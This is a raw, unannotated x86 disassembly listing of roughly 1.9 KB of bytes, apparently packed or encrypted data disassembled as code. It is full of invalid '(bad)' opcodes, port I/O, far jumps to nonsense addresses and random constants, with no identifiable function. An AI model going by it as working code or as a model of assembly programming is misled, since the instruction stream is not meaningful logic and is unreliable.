  40ba49:	fwait
  40ba4a:	in     eax,dx
  40ba4b:	(bad)  
  40ba4c:	pop    ss
  40ba4d:	fld    TBYTE PTR [edx-0x28e18453]
  40ba53:	in     al,0x74
  40ba55:	outs   dx,DWORD PTR ds:[esi]
  40ba56:	fwait
  40ba57:	test   ebx,ebx
  40ba59:	push   ss
  40ba5a:	sbb    esi,DWORD PTR [ebx]
  40ba5c:	ins    DWORD PTR es:[edi],dx
  40ba5d:	inc    DWORD PTR [esi]
  40ba5f:	dec    ebp
  40ba60:	data16 xchg BYTE PTR [ebx],dl
  40ba63:	imul   ebp,DWORD PTR [ebx],0x1df2db
  40ba69:	mov    DWORD PTR [ecx+0x11b6950a],esi
  40ba6f:	stc    
  40ba70:	sub    al,0x6d
  40ba72:	retf   
  40ba73:	jb     0x40bad6
  40ba75:	mov    ch,0x49
  40ba77:	xchg   ecx,eax
  40ba78:	test   BYTE PTR [ecx],ah
  40ba7a:	lea    edx,[edx-0x249e9ad2]
  40ba80:	adc    al,0x9b
  40ba82:	mov    ebp,0x559b9837
  40ba87:	cmp    al,0x2f
  40ba89:	push   0xcdda6ff9
  40ba8e:	inc    ebp
  40ba8f:	add    cl,cl
  40ba91:	jmp    0xfe837f96
  40ba96:	and    edi,DWORD PTR [ebx+0x7d6e95b0]
  40ba9c:	aad    0x50
  40ba9e:	loopne 0x40ba83
  40baa0:	in     eax,dx
  40baa1:	int    0xe9
  40baa3:	lds    ebp,FWORD PTR [ebx-0x1b]
  40baa6:	dec    ebx
  40baa7:	dec    ebx
  40baa8:	inc    ecx
  40baa9:	push   es
  40baaa:	fiadd  DWORD PTR [esi-0x2c06ff81]
  40bab0:	mov    ebx,0xb66e0595
  40bab5:	icebp  
  40bab6:	sub    cl,cl
  40bab8:	lea    ecx,[edx+0x5]
  40babb:	cli    
  40babc:	mov    ecx,0x60596a94
  40bac1:	push   es
  40bac2:	leave  
  40bac3:	jecxz  0x40bad4
  40bac5:	bound  esp,QWORD PTR [ecx+0x43]
  40bac8:	mov    ah,0x2c
  40baca:	popa   
  40bacb:	xor    al,0xd1
  40bacd:	pop    ebx
  40bace:	and    ebx,esi
  40bad0:	rcr    DWORD PTR [eax-0x6a],cl
  40bad3:	gs arpl di,di
  40bad6:	stos   DWORD PTR es:[edi],eax
  40bad7:	(bad)  
  40bad8:	sub    ecx,esp
  40bada:	push   eax
  40badb:	or     edx,DWORD PTR [edi-0x4a2ca0d8]
  40bae1:	add    BYTE PTR [ecx+0x59],cl
  40bae4:	inc    eax
  40bae5:	inc    ecx
  40bae6:	dec    esi
  40bae7:	jmp    0x40ba94
  40bae9:	mov    dl,0xb5
  40baeb:	ins    BYTE PTR es:[edi],dx
  40baec:	sub    eax,0x7ca02b47
  40baf1:	adc    ebx,DWORD PTR [ecx-0x34d7a394]
  40baf7:	jne    0x40ba8f
  40baf9:	fnstcw WORD PTR [ebp-0x71]
  40bafc:	jmp    DWORD PTR [ebx-0x4e]
  40baff:	sub    al,0xdb
  40bb01:	mov    dl,0x84
  40bb03:	cwde   
  40bb04:	mov    edi,0xb26a917d
  40bb09:	sub    eax,0xeb96c2cb
  40bb0e:	jae    0x40baaf
  40bb10:	js     0x40bad1
  40bb12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb13:	retf   
  40bb14:	mov    dl,0x2c
  40bb16:	retf   
  40bb17:	inc    ecx
  40bb18:	lods   eax,DWORD PTR ds:[esi]
  40bb19:	dec    esi
  40bb1a:	mov    dl,0x57
  40bb1c:	mov    ebx,0x2a19b06e
  40bb21:	adc    DWORD PTR [ebx-0x36874c84],esi
  40bb27:	ins    BYTE PTR es:[edi],dx
  40bb28:	mov    cl,0x6d
  40bb2a:	adc    eax,0x7a705204
  40bb2f:	ins    BYTE PTR es:[edi],dx
  40bb30:	push   ecx
  40bb31:	push   0x6c2c2e23
  40bb36:	shl    BYTE PTR [ebx+ebp*8+0x60],cl
  40bb3a:	mov    ebx,0x69c50c5c
  40bb3f:	(bad)  [eax-0x5d]
  40bb42:	push   esp
  40bb43:	xor    edx,DWORD PTR [eax-0x53]
  40bb46:	dec    esp
  40bb47:	sbb    eax,0x85b76848
  40bb4c:	test   DWORD PTR [ebp+0x44],ebp
  40bb4f:	xchg   edx,eax
  40bb50:	inc    eax
  40bb51:	xor    DWORD PTR [ecx+eax*8-0x264b8248],edi
  40bb58:	retf   
  40bb59:	mov    bh,0xb6
  40bb5b:	or     cl,BYTE PTR [ebx-0x57745363]
  40bb61:	push   0x0
  40bb63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb64:	mov    al,ds:0x1b0b4b4b
  40bb69:	arpl   WORD PTR [esp+esi*8-0xd6b7668],bx
  40bb70:	nop
  40bb71:	or     ebp,DWORD PTR [esp+ebp*2]
  40bb74:	ins    BYTE PTR es:[edi],dx
  40bb75:	push   0x4f88398c
  40bb7a:	test   BYTE PTR [ebp-0x80],dh
  40bb7d:	fistp  DWORD PTR [edx-0x42]
  40bb80:	sub    eax,0x34f892fc
  40bb85:	add    ah,dh
  40bb87:	lock or ch,ah
  40bb8a:	inc    esp
  40bb8b:	gs pop ecx
  40bb8d:	mov    esi,0xbf22e874
  40bb92:	xchg   DWORD PTR [eax],eax
  40bb94:	loopne 0x40bbb1
  40bb96:	mov    ds:0xf97cb80e,al
  40bb9b:	push   esi
  40bb9c:	das    
  40bb9d:	rcl    BYTE PTR [edi],1
  40bb9f:	add    ah,cl
  40bba1:	enter  0x1c,0xc4
  40bba5:	shl    ch,0xb
  40bba8:	pop    ebx
  40bba9:	fist   DWORD PTR [esi-0x42]
  40bbac:	cmp    BYTE PTR [eax],bh
  40bbae:	ds xor al,0x67
  40bbb1:	xor    ah,al
  40bbb3:	sub    al,0x5b
  40bbb5:	dec    ebx
  40bbb6:	sbb    esp,DWORD PTR [ebp+0x244e2354]
  40bbbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbbd:	and    ah,bl
  40bbbf:	sbb    al,0x17
  40bbc1:	or     dl,BYTE PTR [edi-0x39e71991]
  40bbc7:	add    BYTE PTR [eax+edx*1],dl
  40bbca:	fild   WORD PTR [ebx-0xc]
  40bbcd:	push   cs
  40bbce:	mov    edi,0x685c2f96
  40bbd3:	jecxz  0x40bc21
  40bbd5:	add    al,0xc4
  40bbd7:	pop    ebx
  40bbd8:	push   ecx
  40bbd9:	add    BYTE PTR [edx-0x33],bh
  40bbdc:	pop    esi
  40bbdd:	arpl   WORD PTR [ecx-0x2d4020d4],bp
  40bbe3:	add    ah,ch
  40bbe5:	inc    edi
  40bbe6:	fucomi st,st(1)
  40bbe8:	cs pushf 
  40bbea:	das    
  40bbeb:	pop    edi
  40bbec:	mov    esi,0x1cf37c
  40bbf1:	addr16 hlt 
  40bbf3:	adc    al,0x0
  40bbf5:	pusha  
  40bbf6:	in     eax,dx
  40bbf7:	or     al,0x0
  40bbf9:	jns    0x40bbe1
  40bbfb:	add    al,0x0
  40bbfd:	repnz in eax,0xcb
  40bc00:	xchg   edi,eax
  40bc01:	jb     0x40bc22
  40bc03:	cld    
  40bc04:	add    BYTE PTR [ebx-0x7bff0bf0],cl
  40bc0a:	or     esp,ebp
  40bc0c:	add    BYTE PTR [ebp-0x683449f],bl
  40bc12:	add    ah,ah
  40bc14:	add    BYTE PTR [esi-0x50ff23c5],dl
  40bc1a:	sub    al,0xd4
  40bc1c:	xchg   ebp,eax
  40bc1d:	enter  0xb079,0xb1
  40bc21:	sub    eax,0x5c3e01c5
  40bc26:	retf   0x479c
  40bc29:	das    
  40bc2a:	(bad)  
  40bc2c:	dec    edx
  40bc2d:	pop    esp
  40bc2e:	sahf   
  40bc2f:	dec    eax
  40bc30:	mov    ds:0x5100a8bc,al
  40bc35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc36:	mov    al,ds:0x46f35a00
  40bc3b:	xchg   edi,eax
  40bc3c:	pop    edx
  40bc3d:	scas   al,BYTE PTR es:[edi]
  40bc3e:	cwde   
  40bc3f:	sub    ebx,DWORD PTR [eax+eax*1-0x7a106b69]
  40bc46:	in     eax,0xcb
  40bc48:	aaa    
  40bc49:	pushf  
  40bc4a:	jge    0x40bbd8
  40bc4c:	add    BYTE PTR [ecx-0x7dff7b8a],cl
  40bc52:	(bad)  
  40bc53:	sbb    al,0x8a
  40bc55:	outs   dx,BYTE PTR ds:[esi]
  40bc56:	jne    0x40bc1c
  40bc58:	jnp    0x40bcca
  40bc5a:	mov    edi,0x6c996174
  40bc5f:	pop    ebp
  40bc60:	pop    eax
  40bc61:	push   0x6492e2ec
  40bc66:	push   edi
  40bc67:	sbb    DWORD PTR [ebx-0x54afa093],ebp
  40bc6d:	jl     0x40bc68
  40bc6f:	mov    dh,0xf5
  40bc71:	push   esp
  40bc72:	dec    edx
  40bc73:	dec    eax
  40bc74:	add    ch,al
  40bc76:	dec    esp
  40bc77:	inc    eax
  40bc78:	add    dh,cl
  40bc7a:	inc    esp
  40bc7b:	icebp  
  40bc7c:	stc    
  40bc7d:	jbe    0x40bce0
  40bc7f:	arpl   WORD PTR [edi-0x478fdcbb],si
  40bc85:	xor    al,0x7a
  40bc87:	sub    BYTE PTR [eax],al
  40bc89:	mov    eax,ds:0xfb65962c
  40bc8e:	push   0xbf3e2220
  40bc93:	xchg   ebx,eax
  40bc94:	pop    es
  40bc95:	xchg   esp,eax
  40bc96:	pop    ecx
  40bc97:	xchg   esi,eax
  40bc98:	gs pop ecx
  40bc9a:	add    BYTE PTR [ebp+0x65128619],cl
  40bca0:	pop    ecx
  40bca1:	xchg   esi,eax
  40bca2:	gs jg  0x40bc90
  40bca5:	jo     0x40bc8b
  40bca7:	imul   edx,DWORD PTR [esi-0x269a69b],0xcf5bf662
  40bcb1:	dec    esp
  40bcb2:	pop    ecx
  40bcb3:	xchg   esi,eax
  40bcb4:	gs pop ecx
  40bcb6:	clc    
  40bcb7:	push   ebp
  40bcb8:	loope  0x40bd18
  40bcba:	jmp    0x9327:0x6596db75
  40bcc1:	sub    BYTE PTR [edi],dl
  40bcc3:	int3   
  40bcc4:	xchg   ebp,eax
  40bcc5:	cmc    
  40bcc6:	mov    bh,0xb6
  40bcc8:	mov    dh,0x7c
  40bcca:	retf   
  40bccb:	out    dx,al
  40bccc:	cs sahf 
  40bcce:	add    BYTE PTR [edi],bh
  40bcd0:	outs   dx,DWORD PTR ds:[esi]
  40bcd1:	mov    ch,cl
  40bcd3:	mov    DWORD PTR ds:0xdc14d0c0,eax
  40bcd9:	mov    edi,0xf9d2f302
  40bcde:	adc    ebp,DWORD PTR [edi+edi*1+0x2e]
  40bce2:	xor    eax,0x6cfa083f
  40bce7:	cmp    al,0xe3
  40bce9:	sub    DWORD PTR [esi+0x46],0xb
  40bced:	push   ss
  40bcee:	outs   dx,BYTE PTR ds:[esi]
  40bcef:	pcmpeqw mm0,mm1
  40bcf2:	mov    edi,0x75c41fce
  40bcf7:	mov    eax,0xa3636da9
  40bcfc:	hlt    
  40bcfd:	push   ecx
  40bcfe:	or     cl,cl
  40bd00:	(bad)  
  40bd01:	adc    DWORD PTR [ecx-0x3bca4758],esi
  40bd07:	ins    DWORD PTR es:[edi],dx
  40bd08:	out    0x4a,eax
  40bd0a:	mov    dl,0x62
  40bd0c:	xchg   esi,eax
  40bd0d:	popf   
  40bd0e:	mov    edi,0xc2e34b9a
  40bd13:	(bad)  
  40bd14:	fadd   DWORD PTR [esi]
  40bd16:	adc    DWORD PTR [edi+0x76b888e3],ebx
  40bd1c:	add    edx,DWORD PTR [esi+edx*8-0x48]
  40bd20:	ins    BYTE PTR es:[edi],dx
  40bd21:	pop    ebx
  40bd22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd23:	fld    QWORD PTR ds:0x21ef3dbb
  40bd29:	mov    edi,0xebedb659
  40bd2e:	sub    DWORD PTR [eax],ebx
  40bd30:	jg     0x40bd6a
  40bd32:	lds    edi,FWORD PTR [esi+0x654737bf]
  40bd38:	pop    ecx
  40bd39:	xchg   esi,eax
  40bd3a:	xor    DWORD PTR gs:[eax+0x3c],ecx
  40bd3e:	push   ecx
  40bd3f:	es mov dh,0x65
  40bd42:	pop    ecx
  40bd43:	xchg   esi,eax
  40bd44:	pop    edx
  40bd45:	and    eax,0xad641e63
  40bd4a:	cmp    al,0xb7
  40bd4c:	lods   eax,DWORD PTR ds:[esi]
  40bd4d:	mov    al,0xdd
  40bd4f:	xor    dl,BYTE PTR [ebp-0x5ffdfa05]
  40bd55:	es enter 0xbb9,0xe6
  40bd5a:	mov    ch,BYTE PTR [ebp-0x57]
  40bd5d:	ins    DWORD PTR es:[edi],dx
  40bd5e:	enter  0xe388,0x4d
  40bd62:	push   esp
  40bd63:	das    
  40bd64:	mov    ds,WORD PTR [edx-0x22]
  40bd67:	cs xchg esp,eax
  40bd69:	jg     0x40bdb7
  40bd6b:	in     eax,dx
  40bd6c:	xlat   BYTE PTR ds:[ebx]
  40bd6d:	sti    
  40bd6e:	add    eax,0x4bdadc00
  40bd73:	pop    edi
  40bd74:	pop    esp
  40bd75:	(bad)  
  40bd77:	aad    0x47
  40bd79:	mov    dh,BYTE PTR [ecx+ebx*4+0x62]
  40bd7d:	sub    DWORD PTR [edi+0x16],0xffffffb6
  40bd81:	lods   eax,DWORD PTR ds:[esi]
  40bd82:	adc    eax,0x3e91f2de
  40bd87:	(bad)  
  40bd88:	sub    al,0x18
  40bd8a:	jbe    0x40bd67
  40bd8c:	fisubr DWORD PTR ds:0x590f2a8a
  40bd92:	je     0x40bd1b
  40bd94:	sub    DWORD PTR [eax],edi
  40bd96:	push   es
  40bd97:	jno    0x40bd1e
  40bd99:	bound  ebp,QWORD PTR [ebx-0x49]
  40bd9c:	bnd jmp 0x40bd5f
  40bd9f:	enter  0x15e0,0x6
  40bda3:	rcl    DWORD PTR [esi-0x5b6d494a],1
  40bda9:	mov    ecx,eax
  40bdab:	xor    DWORD PTR [eax+0x55d808ab],eax
  40bdb1:	xor    al,0xb5
  40bdb3:	cmp    al,0x67
  40bdb5:	stc    
  40bdb6:	in     eax,0xcf
  40bdb8:	cmp    dl,BYTE PTR [ecx+eiz*4]
  40bdbb:	mov    DWORD PTR [esi-0x219e62f7],esi
  40bdc1:	jp     0x40bd99
  40bdc3:	repnz sbb DWORD PTR [edx+0x6d695b0b],ecx
  40bdca:	push   eax
  40bdcb:	pop    esp
  40bdcc:	push   cs
  40bdcd:	dec    esp
  40bdce:	jle    0x40bd88
  40bdd0:	mov    ch,0xad
  40bdd2:	push   0xffffffbb
  40bdd4:	push   ds
  40bdd5:	ficom  DWORD PTR [bp+di+0x58]
  40bdd9:	arpl   WORD PTR [edi+0x6e23add2],cx
  40bddf:	adc    edx,DWORD PTR [eax+ebp*2+0x34ac659]
  40bde6:	add    DWORD PTR [eax],ecx
  40bde8:	test   DWORD PTR [ebp-0x30],ecx
  40bdeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdec:	push   eax
  40bded:	inc    BYTE PTR [ebx]
  40bdef:	pop    edx
  40bdf0:	out    dx,al
  40bdf1:	ds retf 0xc01a
  40bdf5:	mov    dh,0x95
  40bdf7:	jl     0x40be4f
  40bdf9:	mov    esp,0xb52f942c
  40bdfe:	mov    esp,0xe60bddb5
  40be03:	and    eax,0x710a1def
  40be08:	add    ah,ah
  40be0a:	jl     0x40be64
  40be0c:	fcmovu st,st(2)
  40be0e:	push   ss
  40be0f:	mov    ebp,0x92fb05ef
  40be14:	adc    al,0xe1
  40be16:	sub    eax,0x735a5a5f
  40be1b:	out    dx,eax
  40be1c:	loopne 0x40be91
  40be1e:	push   ebx
  40be1f:	(bad)  
  40be20:	int3   
  40be21:	add    BYTE PTR [esi-0x455972b5],ch
  40be27:	sub    eax,0xe780b65f
  40be2c:	fidivr DWORD PTR [esi]
  40be2e:	mov    edx,0xbe50b6d8
  40be33:	les    edx,FWORD PTR [eax]
  40be35:	or     eax,0x19009a6a
  40be3a:	test   al,0x13
  40be3c:	add    bh,BYTE PTR [esi+ebp*1-0x471291cb]
  40be43:	mov    edx,0xbeb10871
  40be48:	aas    
  40be49:	sub    al,0x34
  40be4b:	mov    ebp,0x829a25b
  40be50:	jmp    0xb768:0xe0a3d066
  40be57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be58:	jbe    0x40be6e
  40be5a:	lods   al,BYTE PTR ds:[esi]
  40be5b:	inc    ecx
  40be5c:	cmp    BYTE PTR [esi],ch
  40be5e:	push   esi
  40be5f:	jmp    0x5858:0xdb76bc55
  40be66:	jbe    0x40be4b
  40be68:	and    dl,BYTE PTR [esi+0x54]
  40be6b:	fild   DWORD PTR ds:0x43654544
  40be71:	pop    esp
  40be72:	sub    bh,bh
  40be74:	add    DWORD PTR [eax],0xf800a44f
  40be7a:	mov    esi,0x7eb778fe
  40be7f:	sbb    eax,DWORD PTR [ebp+0x2c3a5ba5]
  40be85:	out    0x61,eax
  40be87:	enter  0xbba5,0x72
  40be8b:	add    al,0xe8
  40be8d:	(bad)  
  40be8e:	(bad)  
  40be8f:	inc    esi
  40be90:	pop    esi
  40be91:	ucomiss xmm3,DWORD PTR [eax-0x5d6b5557]
  40be98:	mov    dh,0x6d
  40be9a:	sub    BYTE PTR [edi+0x49629d07],bl
  40bea0:	or     BYTE PTR [eax-0x30],dh
  40bea3:	mov    eax,0x251cd555
  40bea8:	cmp    al,BYTE PTR [esi]
  40beaa:	outs   dx,BYTE PTR ds:[esi]
  40beab:	pop    ebx
  40beac:	popa   
  40bead:	mov    eax,ds:0xee2c3da
  40beb2:	sbb    dh,BYTE PTR [ecx]
  40beb4:	or     BYTE PTR [eax],dh
  40beb6:	sbb    eax,0x1eb69607
  40bebb:	sahf   
  40bebc:	retf   
  40bebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bebe:	pop    ss
  40bebf:	scas   al,BYTE PTR es:[edi]
  40bec0:	call   FWORD PTR [ebx+0x5b]
  40bec3:	sub    al,BYTE PTR [eax+0xb]
  40bec6:	adc    esp,DWORD PTR [eax]
  40bec8:	es push 0x6d433b9a
  40bece:	(bad)  [eax-0x60]
  40bed1:	mov    ch,0x13
  40bed3:	jp     0x40bf27
  40bed5:	dec    eax
  40bed6:	pop    es
  40bed7:	mov    dh,0xb4
  40bed9:	jl     0x40bf3c
  40bedb:	mov    dl,0xe5
  40bedd:	cs pop edx
  40bedf:	add    BYTE PTR [ebx+0x755cce38],bh
  40bee5:	fild   DWORD PTR [ebp+0x2eddb62d]
  40beec:	scas   al,BYTE PTR es:[edi]
  40beed:	inc    esi
  40beee:	rol    BYTE PTR [ebx-0x562a4c95],1
  40bef4:	or     DWORD PTR [esi],esi
  40bef6:	add    al,0xb3
  40bef8:	push   esp
  40bef9:	sub    DWORD PTR [ebp*2+0xd556c26],edx
  40bf00:	(bad)  
  40bf01:	rcl    ch,1
  40bf03:	enter  0xc096,0xb6
  40bf07:	adc    eax,0xac2c67e
  40bf0c:	xor    edx,esi
  40bf0e:	push   eax
  40bf0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf10:	(bad)  
  40bf11:	(bad)  
  40bf12:	cs pop edi
  40bf14:	mov    esi,0x780254
  40bf19:	fbstp  TBYTE PTR [eax+0x61]
  40bf1c:	add    BYTE PTR [edx],dl
  40bf1e:	call   0x75397e37
  40bf23:	imul   edi,ecx,0x44a3f3d6
  40bf29:	or     al,BYTE PTR [eax]
  40bf2b:	lea    edi,cs:[edx-0x4f49193d]
  40bf32:	push   ebp
  40bf33:	mov    esi,0xec00dc1a
  40bf38:	mov    ah,0x46
  40bf3a:	adc    eax,0xbae953f4
  40bf3f:	aam    0xc2
  40bf41:	ret    0xa61e
  40bf44:	push   es
  40bf45:	mov    dl,0xa5
  40bf47:	ret    
  40bf48:	dec    ecx
  40bf49:	or     eax,DWORD PTR [eax+0x1f50b6db]
  40bf4f:	jns    0x40bf10
  40bf51:	dec    ebp
  40bf52:	out    0xe9,al
  40bf54:	jnp    0x40bef7
  40bf56:	sub    al,0x17
  40bf58:	or     bl,BYTE PTR [ebx+0x491674be]
  40bf5e:	jns    0x40bf52
  40bf60:	imul   esi,DWORD PTR [ebp+0x6b6da236],0xa4fa7d1b
  40bf6a:	les    esi,FWORD PTR [edx+0x51]
  40bf6d:	(bad)  
  40bf6e:	test   al,0xad
  40bf70:	sub    edx,DWORD PTR [ecx-0x1a]
  40bf73:	mov    esp,0xc2d4695f
  40bf78:	in     eax,0x5b
  40bf7a:	in     eax,dx
  40bf7b:	adc    al,BYTE PTR [edi+ebx*2]
  40bf7e:	scas   eax,DWORD PTR es:[edi]
  40bf7f:	scas   al,BYTE PTR es:[edi]
  40bf80:	lea    eax,[eax]
  40bf82:	jnp    0x40bf50
  40bf84:	fwait
  40bf85:	jg     0x40bf49
  40bf87:	mov    dh,0xf0
  40bf89:	shr    edx,1
  40bf8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf8c:	sbb    DWORD PTR [edx-0x26efd389],0xffffffa0
  40bf93:	sub    eax,0xb022db44
  40bf98:	inc    edx
  40bf99:	inc    eax
  40bf9a:	push   esi
  40bf9b:	(bad)  
  40bf9c:	ins    DWORD PTR es:[edi],dx
  40bf9d:	ins    DWORD PTR es:[edi],dx
  40bf9e:	or     ecx,DWORD PTR ds:0x8f812eb9
  40bfa4:	and    BYTE PTR [ecx-0x5d],bh
  40bfa7:	stc    
  40bfa8:	mov    dh,0xb1
  40bfaa:	mov    al,0x98
  40bfac:	cmp    bl,ah
  40bfae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfaf:	test   BYTE PTR [eax+0x33bb35],ch
  40bfb5:	and    al,0xc2
  40bfb7:	lods   eax,DWORD PTR ds:[esi]
  40bfb8:	lea    ebp,[ebp+0x1e]
  40bfbb:	xor    dh,BYTE PTR [esi+0x75]
  40bfbe:	shr    esi,cl
  40bfc0:	push   esi
  40bfc1:	xchg   ebx,eax
  40bfc2:	adc    ebp,DWORD PTR [ebp-0x110d241b]
  40bfc8:	add    ah,cl
  40bfca:	adc    DWORD PTR [ebx+0x480068df],esi
  40bfd0:	jp     0x40bf84
  40bfd2:	and    eax,0x2a8ddb6a
  40bfd7:	push   es
  40bfd8:	test   DWORD PTR [esi+0xb],0x5f900862
  40bfdf:	pop    ss
  40bfe0:	sahf   
  40bfe1:	mov    dh,0x7d
  40bfe3:	aam    0xea
  40bfe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfe6:	mov    edi,0x168c0f2e
  40bfeb:	fwait
  40bfec:	mov    dh,0xb6
  40bfee:	push   ecx
  40bfef:	mov    ah,0x86
  40bff1:	xchg   BYTE PTR [ecx],dl
  40bff3:	lahf   
  40bff4:	fcmovbe st,st(1)
  40bff6:	loope  0x40bfd3
  40bff8:	mov    dh,0xd1
  40bffa:	mov    ch,bl
  40bffc:	stos   DWORD PTR es:[edi],eax
  40bffd:	das    
  40bffe:	xor    eax,0xade4a1f5
  40c003:	sub    eax,0x82dba0ec
  40c008:	and    DWORD PTR [esi-0x42],ebp
  40c00b:	cmp    DWORD PTR [eax],ecx
  40c00d:	lds    esi,FWORD PTR [esi-0x483d5a2a]
  40c013:	inc    ebx
  40c014:	xor    DWORD PTR [esi+0x38584de2],eax
  40c01a:	pop    esi
  40c01b:	mov    eax,ds:0x5ce1b175
  40c020:	leave  
  40c021:	mov    DWORD PTR [ecx],edi
  40c023:	mov    dl,BYTE PTR [esp+edi*2]
  40c026:	in     eax,dx
  40c027:	sbb    al,0xc4
  40c029:	jbe    0x40bfd1
  40c02b:	inc    ebp
  40c02c:	lods   eax,DWORD PTR ds:[esi]
  40c02d:	popa   
  40c02e:	imul   cl
  40c030:	dec    esp
  40c031:	mov    ds:0xadb6170a,al
  40c036:	imul   esi,DWORD PTR [edi-0x50],0x35
  40c03a:	(bad)  
  40c03b:	lods   al,BYTE PTR ds:[esi]
  40c03c:	inc    esi
  40c03d:	shl    DWORD PTR [edi],0x57
  40c040:	mov    ds:0x4a05d8da,eax
  40c045:	ret    
  40c046:	add    DWORD PTR [ebx],edx
  40c048:	push   ss
  40c049:	inc    edi
  40c04a:	dec    ebx
  40c04b:	les    eax,FWORD PTR [ebx+0x49]
  40c04e:	lods   al,BYTE PTR ds:[esi]
  40c04f:	pop    ss
  40c050:	aam    0xd0
  40c052:	push   ss
  40c053:	pop    esp
  40c054:	pop    bx
  40c056:	and    BYTE PTR [edi+0x5e],0x20
  40c05a:	dec    esp
  40c05b:	fldenv [ebx+0x62a85829]
  40c061:	mov    eax,0x501e214b
  40c066:	pop    esp
  40c067:	test   al,0x74
  40c069:	dec    edi
  40c06a:	test   eax,0xb5325cec
  40c06f:	ins    DWORD PTR es:[edi],dx
  40c070:	xor    eax,0x3427d740
  40c075:	or     al,ah
  40c077:	cs or  eax,0x76da03d3
  40c07d:	mov    ds:0x724bfd44,eax
  40c082:	mov    eax,ds:0x54c8abef
  40c087:	scas   al,BYTE PTR es:[edi]
  40c088:	pop    edx
  40c089:	aaa    
  40c08a:	and    DWORD PTR [eax],esp
  40c08c:	pop    edi
  40c08d:	and    cl,bl
  40c08f:	in     eax,dx
  40c090:	mov    eax,ds:0xc7046ada
  40c095:	xlat   BYTE PTR ds:[ebx]
  40c096:	dec    ebp
  40c097:	ret    0xda1a
  40c09a:	push   ss
  40c09b:	mov    dh,0xc2
  40c09d:	aaa    
  40c09e:	scas   al,BYTE PTR es:[edi]
  40c09f:	les    esi,FWORD PTR [esi+0x6bfce28d]
  40c0a5:	push   esp
  40c0a6:	add    eax,0xc4dc6b68
  40c0ab:	cli    
  40c0ac:	pushf  
  40c0ad:	adc    eax,0x50a7a247
  40c0b2:	inc    BYTE PTR [ebp+0x5c1a60b]
  40c0b8:	aaa    
  40c0b9:	sbb    eax,0xa88700
  40c0be:	enter  0xf677,0x61
  40c0c2:	mov    ebx,0x2fcc46b4
  40c0c7:	test   DWORD PTR [esi+0x58f408cb],esp
  40c0cd:	push   0x8
  40c0cf:	aaa    
  40c0d0:	fiadd  DWORD PTR [ebp+0x6ab332d2]
  40c0d6:	sti    
  40c0d7:	sub    WORD PTR [edx],dx
  40c0da:	into   
  40c0db:	mov    WORD PTR [eax+0x63],?
  40c0de:	pop    ebx
  40c0df:	push   0xb01a4f35
  40c0e4:	push   cs
  40c0e5:	imul   ebx,DWORD PTR [esi],0x6ed6dbda
  40c0eb:	sbb    eax,0x6ef7b84
  40c0f0:	ret    
  40c0f1:	push   eax
  40c0f2:	aam    0x69
  40c0f4:	xchg   BYTE PTR [eax+0x6a],dh
  40c0f7:	jecxz  0x40c13b
  40c0f9:	test   edi,edi
  40c0fb:	fs ds jge 0x40c083
  40c0ff:	test   al,0xd8
  40c101:	push   eax
  40c102:	(bad)  [ebp+0x32b60e0e]
  40c108:	pop    edi
  40c109:	retf   0xbb05
  40c10c:	mov    dh,0x4b
  40c10e:	fcmovnbe st,st(6)
  40c110:	icebp  
  40c111:	or     eax,0x5e325fc2
  40c116:	loopne 0x40c18d
  40c118:	in     al,dx
  40c119:	gs scas eax,DWORD PTR es:[edi]
  40c11b:	fcomp  st(2)
  40c11d:	mov    ds,edx
  40c11f:	push   esi
  40c120:	into   
  40c121:	dec    eax
  40c122:	sbb    ebx,DWORD PTR [eax+0x5b361dc8]
  40c128:	inc    edi
  40c129:	pop    esp
  40c12a:	ss gs fwait
  40c12d:	mov    ecx,0xe09a6eb5
  40c132:	and    ebx,DWORD PTR [ebx]
  40c134:	pop    ebx
  40c135:	sbb    ecx,DWORD PTR [ebx]
  40c137:	fs mov ch,0xba
  40c13a:	rol    BYTE PTR [edi],1
  40c13c:	div    dh
  40c13e:	fnsave [esi+0x11]
  40c141:	cmp    eax,DWORD PTR [edx+0x41c1974e]
  40c147:	sbb    DWORD PTR [eax+0x8eadd24],edi
  40c14d:	fdivr  DWORD PTR [ebp-0x33]
  40c150:	jge    0x40c100
  40c152:	call   0xd53410a
  40c157:	shl    BYTE PTR [esi-0x53f4f520],0xc
  40c15e:	out    dx,eax
  40c15f:	mov    dl,0x0
  40c161:	test   ebx,ebx
  40c163:	ret    0x4340
  40c166:	push   0x18bb344
  40c16b:	xor    al,0x6a
  40c16d:	imul   ebx,DWORD PTR [ebx+0x5e],0x35
  40c171:	push   esi
  40c172:	sub    DWORD PTR [ebp-0x7193d3b8],eax
  40c178:	push   ss
  40c179:	fs cmp al,0x8
  40c17c:	inc    ebp
  40c17d:	jae    0x40c13c
  40c17f:	lods   eax,DWORD PTR ds:[esi]
  40c180:	adc    DWORD PTR [ebx+ecx*1-0x3e9713e8],edx
  40c187:	jmp    0xda66c479
  40c18c:	scas   eax,DWORD PTR es:[edi]
  40c18d:	push   esp
  40c18e:	pop    ss
  40c18f:	adc    BYTE PTR [ecx],bh
  40c191:	pop    ecx
  40c192:	fdivr  QWORD PTR [edi+0xb6edb52]
  40c198:	add    esp,DWORD PTR [di+0x69]
  40c19c:	icebp  
  40c19d:	add    ch,bl
  40c19f:	dec    ebp
  40c1a0:	bound  edi,QWORD PTR [ebx-0x393d006b]
  40c1a6:	hlt    
  40c1a7:	lds    eax,FWORD PTR ss:[eax]
  40c1aa:	jns    0x40c12c
  40c1ac:	add    BYTE PTR [edx-0x2],dh
  40c1af:	imul   esi,DWORD PTR [edi-0x77],0xffffffa4
  40c1b3:	mov    al,0x2d
  40c1b5:	mov    ch,0x5b
  40c1b7:	jecxz  0x40c16f
  40c1b9:	mov    edi,0x80622998
  40c1be:	xor    esi,DWORD PTR [eax+0x1fb5b944]
  40c1c4:	repnz or eax,0x2b9aae33
  40c1ca:	jmp    0xc28a:0x9db8d856
